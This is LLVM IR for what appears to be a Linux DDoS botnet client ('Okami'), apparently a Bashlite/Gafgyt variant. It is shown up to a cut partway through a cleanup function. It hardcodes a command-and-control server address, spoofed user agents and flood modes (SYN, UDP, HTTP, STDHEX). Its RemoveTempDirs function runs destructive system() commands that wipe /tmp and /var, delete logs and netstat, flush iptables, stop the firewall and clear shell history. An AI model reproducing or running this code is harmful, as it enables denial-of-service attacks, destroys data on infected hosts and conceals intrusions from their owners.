; ModuleID = 'host/ir_sub/Okami.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"168.235.109.208:6963\00", align 1
@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.17 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.18 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.20 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.21 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.23 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.24 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.25 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.27 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.28 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.30 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.31 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.33 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.36 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.37 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.38 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.39 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.40 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.41 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.42 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.43 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.44 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.45 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.46 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.47 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.48 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.49 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.51 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.52 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.53 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.54 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.55 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.56 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.57 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.58 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.59 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.60 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.61 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.62 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.63 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.64 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.65 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.66 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.67 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.68 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.69 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.70 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.71 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.72 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.12 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.14 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.133 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.73 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@SendSTDHEX.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.75, i32 0, i32 0)], align 8
@.str.75 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)], align 16
@.str.76 = private unnamed_addr constant [17 x i8] c"WYHRzp68omQcEaoW\00", align 1
@.str.77 = private unnamed_addr constant [17 x i8] c"xYjPH0XYQyNnZDd4\00", align 1
@.str.78 = private unnamed_addr constant [20 x i8] c"KaDeNTheBoTNETHeGOD\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"Iger8HgN8DU5Cv2m\00", align 1
@.str.80 = private unnamed_addr constant [17 x i8] c"E0H2DeSLyzQ93Bh2\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"zhYf0MvzTJ1S0ivq\00", align 1
@.str.82 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.83 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.84 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.85 = private unnamed_addr constant [17 x i8] c"UQX1v4chpBay13JL\00", align 1
@.str.86 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.87 = private unnamed_addr constant [17 x i8] c"X1k5ICjenaWIZ4Gf\00", align 1
@.str.88 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.89 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.90 = private unnamed_addr constant [17 x i8] c"1cvFW1QcSuZ627CQ\00", align 1
@.str.91 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.92 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.93 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.95 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.96 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.97 = private unnamed_addr constant [21 x i8] c"UkXK4CDG3OBO1vVufiKv\00", align 1
@.str.98 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.99 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.100 = private unnamed_addr constant [17 x i8] c"SllNepLi918c9I8J\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"Kaden1337\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.103 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.104 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.112 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"STDHEX\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.120 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.126 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.127 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.121 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.122 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.128 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.130 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.132 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i32 0, i32 0))
